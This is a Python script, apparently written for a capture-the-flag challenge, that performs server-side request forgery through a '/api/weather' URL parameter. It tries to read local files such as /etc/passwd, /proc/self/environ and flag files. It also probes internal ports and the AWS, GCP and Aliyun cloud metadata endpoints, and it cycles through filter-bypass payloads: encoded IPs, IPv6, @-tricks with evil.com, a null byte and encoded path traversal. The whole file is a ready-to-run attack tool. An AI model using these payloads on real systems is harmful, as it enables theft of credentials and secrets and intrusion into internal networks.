#!/usr/bin/env python3
import requests
import urllib.parse
import time

class SSRFTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
    
    def test_basic_ssrf(self, target_url):
        """Test basic SSRF with direct URL"""
        try:
            data = {'url': target_url}
            response = self.session.post(f"{self.base_url}/api/weather", data=data, timeout=10)
            return response.status_code, response.text[:500]
        except Exception as e:
            return 0, str(e)
    
    def test_file_protocol(self):
        """Test file:// protocol access"""
        file_paths = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/version',
            'file:///proc/self/environ',
            'file:///flag.txt',
            'file:///app/flag.txt'
        ]
        
        results = []
        for path in file_paths:
            status, response = self.test_basic_ssrf(path)
            results.append({'path': path, 'status': status, 'response': response})
            time.sleep(0.5)
        
        return results
    
    def test_internal_network(self):
        """Test internal network scanning"""
        internal_targets = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://127.0.0.1:3000',
            'http://127.0.0.1:8080',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://100.100.100.200/latest/meta-data/'  # Aliyun metadata
        ]
        
        results = []
        for target in internal_targets:
            status, response = self.test_basic_ssrf(target)
            results.append({'target': target, 'status': status, 'response': response})
            time.sleep(0.5)
        
        return results
    
    def test_bypass_techniques(self):
        """Test various SSRF bypass techniques"""
        bypass_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://0x7f000001:80',  # Hex encoding
            'http://2130706433:80',  # Decimal encoding
            'http://017700000001:80',  # Octal encoding
            'http://[::1]:80',  # IPv6
            'http://127.0.0.1:80@evil.com',  # @ bypass
            'http://evil.com@127.0.0.1:80',  # Reverse @ bypass
            'http://127.0.0.1#evil.com',  # Fragment bypass
            'http://127.0.0.1?evil.com',  # Query bypass
            'http://127.0.0.1:80%00evil.com',  # Null byte
            'http://127.0.0.1:80/%2e%2e/flag.txt'  # URL encoded path traversal
        ]
        
        results = []
        for payload in bypass_payloads:
            status, response = self.test_basic_ssrf(payload)
            results.append({'payload': payload, 'status': status, 'response': response})
            time.sleep(0.5)
        
        return results

if __name__ == "__main__":
    # Usage: python3 ssrf_test.py http://95.216.124.220:32469
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 ssrf_test.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    tester = SSRFTester(target_url)
    
    print("=== Testing File Protocol Access ===")
    file_results = tester.test_file_protocol()
    for result in file_results:
        print(f"Path: {result['path']} | Status: {result['status']}")
        if result['status'] != 0:
            print(f"Response: {result['response'][:200]}...")
        print()
    
    print("=== Testing Internal Network ===")
    network_results = tester.test_internal_network()
    for result in network_results:
        print(f"Target: {result['target']} | Status: {result['status']}")
        if result['status'] != 0:
            print(f"Response: {result['response'][:200]}...")
        print()
    
    print("=== Testing Bypass Techniques ===")
    bypass_results = tester.test_bypass_techniques()
    for result in bypass_results:
        print(f"Payload: {result['payload']} | Status: {result['status']}")
        if result['status'] != 0:
            print(f"Response: {result['response'][:200]}...")
        print()
